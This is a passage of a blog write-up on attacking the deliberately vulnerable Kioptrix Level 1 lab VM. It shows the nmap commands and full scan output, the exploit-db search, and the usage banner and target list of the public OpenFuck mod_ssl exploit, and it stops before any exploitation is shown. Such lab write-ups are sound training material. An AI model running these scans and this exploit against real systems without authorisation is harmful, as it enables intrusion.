@@ -1,0 +1,437 @@
+<!doctype html><html lang=en-us><head><link rel=preload href=/lib/font-awesome/webfonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin=anonymous><link rel=preload href=/lib/font-awesome/webfonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin=anonymous><link rel=preload href=/lib/font-awesome/webfonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin=anonymous><link rel=preload href=/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2 as=font type=font/woff2 crossorigin=anonymous><script type=text/javascript src=https://latest.cactus.chat/cactus.js></script>
+<link rel=stylesheet href=https://latest.cactus.chat/style.css type=text/css><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>Kioptix Level 1 | PysKa's Writeups</title><link rel=canonical href=https://pyska-ratzinger.github.io/posts/2022-05-06-kioptrix-level-1/><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="all,follow"><meta name=googlebot content="index,follow,snippet,archive"><meta property="og:title" content="Kioptix Level 1"><meta property="og:description" content="1. Pre-Enumeration phase: Nothing to do here. When you start a VM, the IP address is usually shown on one of the interfaces. In my case, the VM is running at 192.168.122.203. To avoid memorizing it, and since this is a single machine, I&rsquo;ve modified my /etc/hosts file to include the following:
+192.168.122.203	lan_kioptix Now, my computer will understand lan_kioptix is an address that points to our vulnerable VM, and will redirect all requests directed at this address to the VM."><meta property="og:type" content="article"><meta property="og:url" content="https://pyska-ratzinger.github.io/posts/2022-05-06-kioptrix-level-1/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-05-05T17:53:43+01:00"><meta property="article:modified_time" content="2022-05-05T17:53:43+01:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="Kioptix Level 1"><meta name=twitter:description content="1. Pre-Enumeration phase: Nothing to do here. When you start a VM, the IP address is usually shown on one of the interfaces. In my case, the VM is running at 192.168.122.203. To avoid memorizing it, and since this is a single machine, I&rsquo;ve modified my /etc/hosts file to include the following:
+192.168.122.203	lan_kioptix Now, my computer will understand lan_kioptix is an address that points to our vulnerable VM, and will redirect all requests directed at this address to the VM."><link rel=stylesheet href=https://pyska-ratzinger.github.io/css/styles.c05d68261bf086a9d7713c4f8a6215a3601608e267a816a7ee58f139b3d1aae51222aae2081c8e0c6bd35e1334773b7a16283022f31f92afd93bb37e5e822e66.css integrity="sha512-wF1oJhvwhqnXcTxPimIVo2AWCOJnqBan7ljxObPRquUSIqriCByODGvTXhM0dzt6FigwIvMfkq/ZO7N+XoIuZg=="><!--[if lt IE 9]><script src=https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js></script>
+<script src=https://oss.maxcdn.com/respond/1.4.2/respond.min.js></script><![endif]--><link rel=icon type=image/png href=https://pyska-ratzinger.github.io/images/favicon.ico></head><body class="max-width mx-auto px3 ltr"><div class="content index py4"><div id=header-post><a id=menu-icon href=#><i class="fas fa-bars fa-lg"></i></a>
+<a id=menu-icon-tablet href=#><i class="fas fa-bars fa-lg"></i></a>
+<a id=top-icon-tablet href=# onclick='$("html, body").animate({scrollTop:0},"fast")' style=display:none aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
+<span id=menu><span id=nav><ul><li><a href=/>Home</a></li><li><a href=/posts>All posts</a></li><li><a href=/tags>Tags</a></li><li><a href=/about>About</a></li></ul></span><br><span id=actions><ul><li><a class=icon href=https://pyska-ratzinger.github.io/posts/2022-05-06-hackmyvm-venus/ aria-label=Next><i class="fas fa-chevron-right" aria-hidden=true onmouseover='$("#i-next").toggle()' onmouseout='$("#i-next").toggle()'></i></a></li><li><a class=icon href=# onclick='$("html, body").animate({scrollTop:0},"fast")' aria-label="Top of Page"><i class="fas fa-chevron-up" aria-hidden=true onmouseover='$("#i-top").toggle()' onmouseout='$("#i-top").toggle()'></i></a></li><li><a class=icon href=# aria-label=Share><i class="fas fa-share-alt" aria-hidden=true onmouseover='$("#i-share").toggle()' onmouseout='$("#i-share").toggle()' onclick='return $("#share").toggle(),!1'></i></a></li></ul><span id=i-prev class=info style=display:none>Previous post</span>
+<span id=i-next class=info style=display:none>Next post</span>
+<span id=i-top class=info style=display:none>Back to top</span>
+<span id=i-share class=info style=display:none>Share post</span></span><br><div id=share style=display:none><ul><li><a class=icon href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fpyska-ratzinger.github.io%2fposts%2f2022-05-06-kioptrix-level-1%2f" aria-label=Facebook><i class="fab fa-facebook" aria-hidden=true></i></a></li><li><a class=icon href="https://twitter.com/share?url=https%3a%2f%2fpyska-ratzinger.github.io%2fposts%2f2022-05-06-kioptrix-level-1%2f&text=Kioptix%20Level%201" aria-label=Twitter><i class="fab fa-twitter" aria-hidden=true></i></a></li><li><a class=icon href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fpyska-ratzinger.github.io%2fposts%2f2022-05-06-kioptrix-level-1%2f&title=Kioptix%20Level%201" aria-label=Linkedin><i class="fab fa-linkedin" aria-hidden=true></i></a></li><li><a class=icon href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fpyska-ratzinger.github.io%2fposts%2f2022-05-06-kioptrix-level-1%2f&is_video=false&description=Kioptix%20Level%201" aria-label=Pinterest><i class="fab fa-pinterest" aria-hidden=true></i></a></li><li><a class=icon href="mailto:?subject=Kioptix%20Level%201&body=Check out this article: https%3a%2f%2fpyska-ratzinger.github.io%2fposts%2f2022-05-06-kioptrix-level-1%2f" aria-label=Email><i class="fas fa-envelope" aria-hidden=true></i></a></li><li><a class=icon href="https://getpocket.com/save?url=https%3a%2f%2fpyska-ratzinger.github.io%2fposts%2f2022-05-06-kioptrix-level-1%2f&title=Kioptix%20Level%201" aria-label=Pocket><i class="fab fa-get-pocket" aria-hidden=true></i></a></li><li><a class=icon href="http://reddit.com/submit?url=https%3a%2f%2fpyska-ratzinger.github.io%2fposts%2f2022-05-06-kioptrix-level-1%2f&title=Kioptix%20Level%201" aria-label=reddit><i class="fab fa-reddit" aria-hidden=true></i></a></li><li><a class=icon href="http://www.tumblr.com/share/link?url=https%3a%2f%2fpyska-ratzinger.github.io%2fposts%2f2022-05-06-kioptrix-level-1%2f&name=Kioptix%20Level%201&description=1.%20Pre-Enumeration%20phase%3a%20Nothing%20to%20do%20here.%20When%20you%20start%20a%20VM%2c%20the%20IP%20address%20is%20usually%20shown%20on%20one%20of%20the%20interfaces.%20In%20my%20case%2c%20the%20VM%20is%20running%20at%20192.168.122.203.%20To%20avoid%20memorizing%20it%2c%20and%20since%20this%20is%20a%20single%20machine%2c%20I%26rsquo%3bve%20modified%20my%20%2fetc%2fhosts%20file%20to%20include%20the%20following%3a%0a192.168.122.203%09lan_kioptix%20Now%2c%20my%20computer%20will%20understand%20lan_kioptix%20is%20an%20address%20that%20points%20to%20our%20vulnerable%20VM%2c%20and%20will%20redirect%20all%20requests%20directed%20at%20this%20address%20to%20the%20VM." aria-label=Tumblr><i class="fab fa-tumblr" aria-hidden=true></i></a></li><li><a class=icon href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fpyska-ratzinger.github.io%2fposts%2f2022-05-06-kioptrix-level-1%2f&t=Kioptix%20Level%201" aria-label="Hacker News"><i class="fab fa-hacker-news" aria-hidden=true></i></a></li></ul></div><div id=toc><nav id=TableOfContents></nav></div></span></div><article class=post itemscope itemtype=http://schema.org/BlogPosting><header><h1 class=posttitle itemprop="name headline">Kioptix Level 1</h1><div class=meta><div class=postdate><time datetime="2022-05-05 17:53:43 +0100 WEST" itemprop=datePublished>2022-05-05</time></div><div class=article-read-time><i class="far fa-clock"></i>
+11 minute read</div></div></header><div class=content itemprop=articleBody><h1 id=1-pre-enumeration-phase>1. Pre-Enumeration phase:</h1><p>Nothing to do here. When you start a VM, the IP address is usually shown on
+one of the interfaces. In my case, the VM is running at <em>192.168.122.203</em>.
+To avoid memorizing it, and since this is a single machine, I&rsquo;ve modified my
+<em>/etc/hosts</em> file to include the following:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plaintext data-lang=plaintext><span style=display:flex><span>192.168.122.203		lan_kioptix</span></span></code></pre></div><p>Now, my computer will understand <em>lan_kioptix</em> is an address that points to
+our vulnerable VM, and will redirect all requests directed at this address to
+the VM.</p><h1 id=2-enumeration-phase>2. Enumeration phase:</h1><p>As usual, when we don&rsquo;t know anything about the machine, we start by doing a
+UDP/TCP scan of the open ports. Since a UDP scan takes longer, we run these
+scans separately, and we begin analyzing the results of the TCP scan even
+while the UDP scan is ongoing.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Run these on 2 different terminals</span>
+</span></span><span style=display:flex><span>$ nmap -A -O -T4 -sU --top-ports <span style=color:#ae81ff>1000</span> -vvv -oN 01_nmap.udp lan_kioptix
+</span></span><span style=display:flex><span>$ nmap -A -O -T4 -sS -p1-65535 -vvv -oN 01_nmap.tcp lan_kioptix</span></span></code></pre></div><p>The TCP scan will give us the following</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plaintext data-lang=plaintext><span style=display:flex><span># Nmap 7.92 scan initiated Sun May  1 19:41:29 2022 as: nmap -A -O -T4 -sS -p1-65535 -vvv -oN 01_nmap.tcp lan_kioptix
+</span></span><span style=display:flex><span>Nmap scan report for lan_kioptix (192.168.122.203)
+</span></span><span style=display:flex><span>Host is up, received arp-response (0.00063s latency).
+</span></span><span style=display:flex><span>Scanned at 2022-05-01 19:41:30 WEST for 26s
+</span></span><span style=display:flex><span>Not shown: 65529 closed tcp ports (reset)
+</span></span><span style=display:flex><span>PORT      STATE SERVICE     REASON         VERSION
+</span></span><span style=display:flex><span>22/tcp    open  ssh         syn-ack ttl 64 OpenSSH 2.9p2 (protocol 1.99)
+</span></span><span style=display:flex><span>|_sshv1: Server supports SSHv1
+</span></span><span style=display:flex><span>| ssh-hostkey: 
+</span></span><span style=display:flex><span>|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
+</span></span><span style=display:flex><span>| 1024 35 109482092953601530927446985143812377560925655194254170270380314520841776849335628258408994190413716152105684423280369467219093526740118507720167655934779634416983599247086840099503203800281526143567271862466057363705861760702664279290804439502645034586412570490614431533437479630834594344497670338190191879537
+</span></span><span style=display:flex><span>|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
+</span></span><span style=display:flex><span>| ssh-dss AAAAB3NzaC1kc3MAAACBAKtycvxuV/e7s2cN74HyTZXHXiBrwyiZe/PKT/inuT5NDSQTPsGiyJZU4gefPAsYKSw5wLe28TDlZWHAdXpNdwyn4QrFQBjwFR+8WbFiAZBoWlSfQPR2RQW8i32Y2P2V79p4mu742HtWBz0hTjkd9qL5j8KCUPDfY9hzDuViWy7PAAAAFQCY9bvq+5rs1OpY5/DGsGx0k6CqGwAAAIBVpBtIHbhvoQdN0WPe8d6OzTTFvdNRa8pWKzV1Hpw+e3qsC4LYHAy1NoeaqK8uJP9203MEkxrd2OoBJKn/8EXlKAco7vC1dr/QWae+NEkI1a38x0Ml545vHAGFaVUWkffHekjhR476Uq4N4qeLfFp5B+v+9flLxYVYsY/ymJKpNgAAAIEApyjrqjgX0AE4fSBFntGFWM3j5M3lc5jw/0qufXlHJu8sZG0FRf9wTI6HlJHHsIKHA7FZ33vGLq3TRmvZucJZ0l55fV2ASS9uvQRE+c8P6w72YCzgJN7v4hYXxnY4RiWvINjW/F6ApQEUJc742i6Fn54FEYAIy5goatGFMwpVq3Q=
+</span></span><span style=display:flex><span>|   1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
+</span></span><span style=display:flex><span>|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAIEAvv8UUWsrO7+VCG/rTWY72jElft4WXfXGWybh141E8XnWxMCu+R1qdocxhh+4Clz8wO9beuZzG1rjlAD+XHiR3j2P+sw6UODeyBkuP24a+7V8P5nu9ksKD1fA83RyelgSgRJNQgPfFU3gngNno1yN6ossqkcMQTI1CY5nF6iYePs=
+</span></span><span style=display:flex><span>80/tcp    open  http        syn-ack ttl 64 Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
+</span></span><span style=display:flex><span>|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+</span></span><span style=display:flex><span>| http-methods: 
+</span></span><span style=display:flex><span>|   Supported Methods: GET HEAD OPTIONS TRACE
+</span></span><span style=display:flex><span>|_  Potentially risky methods: TRACE
+</span></span><span style=display:flex><span>|_http-title: Test Page for the Apache Web Server on Red Hat Linux
+</span></span><span style=display:flex><span>111/tcp   open  rpcbind     syn-ack ttl 64 2 (RPC #100000)
+</span></span><span style=display:flex><span>| rpcinfo: 
+</span></span><span style=display:flex><span>|   program version    port/proto  service
+</span></span><span style=display:flex><span>|   100000  2            111/tcp   rpcbind
+</span></span><span style=display:flex><span>|   100000  2            111/udp   rpcbind
+</span></span><span style=display:flex><span>|   100024  1          32768/tcp   status
+</span></span><span style=display:flex><span>|_  100024  1          32768/udp   status
+</span></span><span style=display:flex><span>139/tcp   open  netbios-ssn syn-ack ttl 64 Samba smbd (workgroup: MYGROUP)
+</span></span><span style=display:flex><span>443/tcp   open  ssl/https   syn-ack ttl 64 Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+</span></span><span style=display:flex><span>|_ssl-date: 2022-05-01T22:41:55+00:00; +3h59m59s from scanner time.
+</span></span><span style=display:flex><span>| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--/localityName=SomeCity/emailAddress=root@localhost.localdomain/organizationalUnitName=SomeOrganizationalUnit
+</span></span><span style=display:flex><span>| Issuer: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--/localityName=SomeCity/emailAddress=root@localhost.localdomain/organizationalUnitName=SomeOrganizationalUnit
+</span></span><span style=display:flex><span>| Public Key type: rsa
+</span></span><span style=display:flex><span>| Public Key bits: 1024
+</span></span><span style=display:flex><span>| Signature Algorithm: md5WithRSAEncryption
+</span></span><span style=display:flex><span>| Not valid before: 2009-09-26T09:32:06
+</span></span><span style=display:flex><span>| Not valid after:  2010-09-26T09:32:06
+</span></span><span style=display:flex><span>| MD5:   78ce 5293 4723 e7fe c28d 74ab 42d7 02f1
+</span></span><span style=display:flex><span>| SHA-1: 9c42 91c3 bed2 a95b 983d 10ac f766 ecb9 8766 1d33
+</span></span><span style=display:flex><span>| -----BEGIN CERTIFICATE-----
+</span></span><span style=display:flex><span>| MIIEDDCCA3WgAwIBAgIBADANBgkqhkiG9w0BAQQFADCBuzELMAkGA1UEBhMCLS0x
+</span></span><span style=display:flex><span>| EjAQBgNVBAgTCVNvbWVTdGF0ZTERMA8GA1UEBxMIU29tZUNpdHkxGTAXBgNVBAoT
+</span></span><span style=display:flex><span>| EFNvbWVPcmdhbml6YXRpb24xHzAdBgNVBAsTFlNvbWVPcmdhbml6YXRpb25hbFVu
+</span></span><span style=display:flex><span>| aXQxHjAcBgNVBAMTFWxvY2FsaG9zdC5sb2NhbGRvbWFpbjEpMCcGCSqGSIb3DQEJ
+</span></span><span style=display:flex><span>| ARYacm9vdEBsb2NhbGhvc3QubG9jYWxkb21haW4wHhcNMDkwOTI2MDkzMjA2WhcN
+</span></span><span style=display:flex><span>| MTAwOTI2MDkzMjA2WjCBuzELMAkGA1UEBhMCLS0xEjAQBgNVBAgTCVNvbWVTdGF0
+</span></span><span style=display:flex><span>| ZTERMA8GA1UEBxMIU29tZUNpdHkxGTAXBgNVBAoTEFNvbWVPcmdhbml6YXRpb24x
+</span></span><span style=display:flex><span>| HzAdBgNVBAsTFlNvbWVPcmdhbml6YXRpb25hbFVuaXQxHjAcBgNVBAMTFWxvY2Fs
+</span></span><span style=display:flex><span>| aG9zdC5sb2NhbGRvbWFpbjEpMCcGCSqGSIb3DQEJARYacm9vdEBsb2NhbGhvc3Qu
+</span></span><span style=display:flex><span>| bG9jYWxkb21haW4wgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAM4BXiK5bWlS
+</span></span><span style=display:flex><span>| ob4B6a9ALmKDbSxqoMcM3pvGHscFsJs+fHHn+CjU1DX44LPDNOwwOl6Uqb+GtZJv
+</span></span><span style=display:flex><span>| 6juVetDwcTbbocC2BM+6x6gyV/H6aYuCssCwrOuVKWp7l9xVpadjITUmhh+uB81q
+</span></span><span style=display:flex><span>| yqopt//Z4THww7SezLJQXi1+Grmp3iFDAgMBAAGjggEcMIIBGDAdBgNVHQ4EFgQU
+</span></span><span style=display:flex><span>| 7OdRS0NrbNB8gE9qUjcw8LF8xKAwgegGA1UdIwSB4DCB3YAU7OdRS0NrbNB8gE9q
+</span></span><span style=display:flex><span>| Ujcw8LF8xKChgcGkgb4wgbsxCzAJBgNVBAYTAi0tMRIwEAYDVQQIEwlTb21lU3Rh
+</span></span><span style=display:flex><span>| dGUxETAPBgNVBAcTCFNvbWVDaXR5MRkwFwYDVQQKExBTb21lT3JnYW5pemF0aW9u
+</span></span><span style=display:flex><span>| MR8wHQYDVQQLExZTb21lT3JnYW5pemF0aW9uYWxVbml0MR4wHAYDVQQDExVsb2Nh
+</span></span><span style=display:flex><span>| bGhvc3QubG9jYWxkb21haW4xKTAnBgkqhkiG9w0BCQEWGnJvb3RAbG9jYWxob3N0
+</span></span><span style=display:flex><span>| LmxvY2FsZG9tYWluggEAMAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQEEBQADgYEA
+</span></span><span style=display:flex><span>| Vgrmpprfkmd8vy0E0UmZvWdIcDrIYRvUWcwSFwc6bGqJeJr0CYSB+jDQzA6Cu7nt
+</span></span><span style=display:flex><span>| xjrlXxEjHFBBbF4iEMJDnuQTFGvICQIcrqJoH3lqAO73u4TeBDjhv5n+h+S37CHd
+</span></span><span style=display:flex><span>| 1lvgRgoOay9dWaLKOyUThgKF2HcPWMZIj2froo5eihM=
+</span></span><span style=display:flex><span>|_-----END CERTIFICATE-----
+</span></span><span style=display:flex><span>| sslv2: 
+</span></span><span style=display:flex><span>|   SSLv2 supported
+</span></span><span style=display:flex><span>|   ciphers: 
+</span></span><span style=display:flex><span>|     SSL2_DES_192_EDE3_CBC_WITH_MD5
+</span></span><span style=display:flex><span>|     SSL2_RC4_128_WITH_MD5
+</span></span><span style=display:flex><span>|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
+</span></span><span style=display:flex><span>|     SSL2_DES_64_CBC_WITH_MD5
+</span></span><span style=display:flex><span>|     SSL2_RC4_64_WITH_MD5
+</span></span><span style=display:flex><span>|     SSL2_RC4_128_EXPORT40_WITH_MD5
+</span></span><span style=display:flex><span>|_    SSL2_RC2_128_CBC_WITH_MD5
+</span></span><span style=display:flex><span>|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+</span></span><span style=display:flex><span>|_http-title: 400 Bad Request
+</span></span><span style=display:flex><span>| http-methods: 
+</span></span><span style=display:flex><span>|_  Supported Methods: GET HEAD POST
+</span></span><span style=display:flex><span>32768/tcp open  status      syn-ack ttl 64 1 (RPC #100024)
+</span></span><span style=display:flex><span>MAC Address: 52:54:00:26:0B:1C (QEMU virtual NIC)
+</span></span><span style=display:flex><span>Device type: general purpose
+</span></span><span style=display:flex><span>Running: Linux 2.4.X
+</span></span><span style=display:flex><span>OS CPE: cpe:/o:linux:linux_kernel:2.4
+</span></span><span style=display:flex><span>OS details: Linux 2.4.9 - 2.4.18 (likely embedded)
+</span></span><span style=display:flex><span>TCP/IP fingerprint:
+</span></span><span style=display:flex><span>OS:SCAN(V=7.92%E=4%D=5/1%OT=22%CT=1%CU=38606%PV=Y%DS=1%DC=D%G=Y%M=525400%TM
+</span></span><span style=display:flex><span>OS:=626ED474%P=x86_64-pc-linux-gnu)SEQ(SP=CD%GCD=1%ISR=D2%TI=Z%CI=Z%II=I%TS
+</span></span><span style=display:flex><span>OS:=7)OPS(O1=M5B4ST11NW0%O2=M5B4ST11NW0%O3=M5B4NNT11NW0%O4=M5B4ST11NW0%O5=M
+</span></span><span style=display:flex><span>OS:5B4ST11NW0%O6=M5B4ST11)WIN(W1=16A0%W2=16A0%W3=16A0%W4=16A0%W5=16A0%W6=16
+</span></span><span style=display:flex><span>OS:A0)ECN(R=Y%DF=Y%T=40%W=16D0%O=M5B4NNSNW0%CC=N%Q=)T1(R=Y%DF=Y%T=40%S=O%A=
+</span></span><span style=display:flex><span>OS:S+%F=AS%RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%T=40%W=16A0%S=O%A=S+%F=AS%O=M5B4ST11N
+</span></span><span style=display:flex><span>OS:W0%RD=0%Q=)T4(R=Y%DF=Y%T=FF%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=FF%
+</span></span><span style=display:flex><span>OS:W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=FF%W=0%S=A%A=Z%F=R%O=%RD=0%Q=
+</span></span><span style=display:flex><span>OS:)T7(R=Y%DF=Y%T=FF%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=FF%IPL=164%
+</span></span><span style=display:flex><span>OS:UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=FF%CD=S)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Uptime guess: 0.007 days (since Sun May  1 19:31:56 2022)
+</span></span><span style=display:flex><span>Network Distance: 1 hop
+</span></span><span style=display:flex><span>TCP Sequence Prediction: Difficulty=205 (Good luck!)
+</span></span><span style=display:flex><span>IP ID Sequence Generation: All zeros
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Host script results:
+</span></span><span style=display:flex><span>|_clock-skew: 3h59m58s
+</span></span><span style=display:flex><span>|_smb2-time: Protocol negotiation failed (SMB2)
+</span></span><span style=display:flex><span>|_smb2-security-mode: Couldn&#39;t establish a SMBv2 connection.
+</span></span><span style=display:flex><span>| nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
+</span></span><span style=display:flex><span>| Names:
+</span></span><span style=display:flex><span>|   KIOPTRIX&lt;00&gt;         Flags: &lt;unique&gt;&lt;active&gt;
+</span></span><span style=display:flex><span>|   KIOPTRIX&lt;03&gt;         Flags: &lt;unique&gt;&lt;active&gt;
+</span></span><span style=display:flex><span>|   KIOPTRIX&lt;20&gt;         Flags: &lt;unique&gt;&lt;active&gt;
+</span></span><span style=display:flex><span>|   \x01\x02__MSBROWSE__\x02&lt;01&gt;  Flags: &lt;group&gt;&lt;active&gt;
+</span></span><span style=display:flex><span>|   MYGROUP&lt;00&gt;          Flags: &lt;group&gt;&lt;active&gt;
+</span></span><span style=display:flex><span>|   MYGROUP&lt;1d&gt;          Flags: &lt;unique&gt;&lt;active&gt;
+</span></span><span style=display:flex><span>|   MYGROUP&lt;1e&gt;          Flags: &lt;group&gt;&lt;active&gt;
+</span></span><span style=display:flex><span>| Statistics:
+</span></span><span style=display:flex><span>|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+</span></span><span style=display:flex><span>|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+</span></span><span style=display:flex><span>|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
+</span></span><span style=display:flex><span>| p2p-conficker: 
+</span></span><span style=display:flex><span>|   Checking for Conficker.C or higher...
+</span></span><span style=display:flex><span>|   Check 1 (port 14216/tcp): CLEAN (Couldn&#39;t connect)
+</span></span><span style=display:flex><span>|   Check 2 (port 44853/tcp): CLEAN (Couldn&#39;t connect)
+</span></span><span style=display:flex><span>|   Check 3 (port 49676/udp): CLEAN (Timeout)
+</span></span><span style=display:flex><span>|   Check 4 (port 52763/udp): CLEAN (Failed to receive data)
+</span></span><span style=display:flex><span>|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>TRACEROUTE
+</span></span><span style=display:flex><span>HOP RTT     ADDRESS
+</span></span><span style=display:flex><span>1   0.63 ms lan_kioptix (192.168.122.203)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Read data files from: /usr/bin/../share/nmap
+</span></span><span style=display:flex><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style=display:flex><span># Nmap done at Sun May  1 19:41:56 2022 -- 1 IP address (1 host up) scanned in 26.63 seconds</span></span></code></pre></div><p>We can see that the ports <em>22, 80, 111, 139 and 443</em> are open. My first
+instinct after enumerating open ports is searching on exploit-db whether or
+not there are public exploits for the services running on the machine. So I
+tried searching for:</p><ul><li>OpenSSH 2.9p2 (no exploits found)</li><li>Apache 1.3.20 (no exploits found)</li><li>mod_ssl 2.8.4 (found OpenFuck exploit)</li><li>We can continue to enumerate other services in case this one does not work.</li></ul><p>I ended up using exploit 47080 from exploit-db. This exploit needs us to tell
+him which version of the server we are attacking, as shown by it&rsquo;s usage
+message:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plaintext data-lang=plaintext><span style=display:flex><span>******************************************************************
+</span></span><span style=display:flex><span>* OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open  *
+</span></span><span style=display:flex><span>******************************************************************
+</span></span><span style=display:flex><span>* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
+</span></span><span style=display:flex><span>* #hackarena  irc.brasnet.org                                     *
+</span></span><span style=display:flex><span>* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
+</span></span><span style=display:flex><span>* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
+</span></span><span style=display:flex><span>* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
+</span></span><span style=display:flex><span>******************************************************************
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>: Usage: ./47080 target box [port] [-c N]
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  target - supported box eg: 0x00
+</span></span><span style=display:flex><span>  box - hostname or IP address
+</span></span><span style=display:flex><span>  port - port for ssl connection
+</span></span><span style=display:flex><span>  -c open N connections. (use range 40-50 if u dont know)
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  Supported OffSet:
+</span></span><span style=display:flex><span>	0x00 - Caldera OpenLinux (apache-1.3.26)
+</span></span><span style=display:flex><span>	0x01 - Cobalt Sun 6.0 (apache-1.3.12)
+</span></span><span style=display:flex><span>	0x02 - Cobalt Sun 6.0 (apache-1.3.20)
+</span></span><span style=display:flex><span>	0x03 - Cobalt Sun x (apache-1.3.26)
+</span></span><span style=display:flex><span>	0x04 - Cobalt Sun x Fixed2 (apache-1.3.26)
+</span></span><span style=display:flex><span>	0x05 - Conectiva 4 (apache-1.3.6)
+</span></span><span style=display:flex><span>	0x06 - Conectiva 4.1 (apache-1.3.9)
+</span></span><span style=display:flex><span>	0x07 - Conectiva 6 (apache-1.3.14)
+</span></span><span style=display:flex><span>	0x08 - Conectiva 7 (apache-1.3.12)
+</span></span><span style=display:flex><span>	0x09 - Conectiva 7 (apache-1.3.19)
+</span></span><span style=display:flex><span>	0x0a - Conectiva 7/8 (apache-1.3.26)
+</span></span><span style=display:flex><span>	0x0b - Conectiva 8 (apache-1.3.22)
+</span></span><span style=display:flex><span>	0x0c - Debian GNU Linux 2.2 Potato (apache_1.3.9-14.1)
+</span></span><span style=display:flex><span>	0x0d - Debian GNU Linux (apache_1.3.19-1)
+</span></span><span style=display:flex><span>	0x0e - Debian GNU Linux (apache_1.3.22-2)
+</span></span><span style=display:flex><span>	0x0f - Debian GNU Linux (apache-1.3.22-2.1)
+</span></span><span style=display:flex><span>	0x10 - Debian GNU Linux (apache-1.3.22-5)
+</span></span><span style=display:flex><span>	0x11 - Debian GNU Linux (apache_1.3.23-1)
+</span></span><span style=display:flex><span>	0x12 - Debian GNU Linux (apache_1.3.24-2.1)
+</span></span><span style=display:flex><span>	0x13 - Debian Linux GNU Linux 2 (apache_1.3.24-2.1)
+</span></span><span style=display:flex><span>	0x14 - Debian GNU Linux (apache_1.3.24-3)
+</span></span><span style=display:flex><span>	0x15 - Debian GNU Linux (apache-1.3.26-1)
+</span></span><span style=display:flex><span>	0x16 - Debian GNU Linux 3.0 Woody (apache-1.3.26-1)
+</span></span><span style=display:flex><span>	0x17 - Debian GNU Linux (apache-1.3.27)
+</span></span><span style=display:flex><span>	0x18 - FreeBSD (apache-1.3.9)
+</span></span><span style=display:flex><span>	0x19 - FreeBSD (apache-1.3.11)
+</span></span><span style=display:flex><span>	0x1a - FreeBSD (apache-1.3.12.1.40)
+</span></span><span style=display:flex><span>	0x1b - FreeBSD (apache-1.3.12.1.40)
+</span></span><span style=display:flex><span>	0x1c - FreeBSD (apache-1.3.12.1.40)
+</span></span><span style=display:flex><span>	0x1d - FreeBSD (apache-1.3.12.1.40_1)
+</span></span><span style=display:flex><span>	0x1e - FreeBSD (apache-1.3.12)
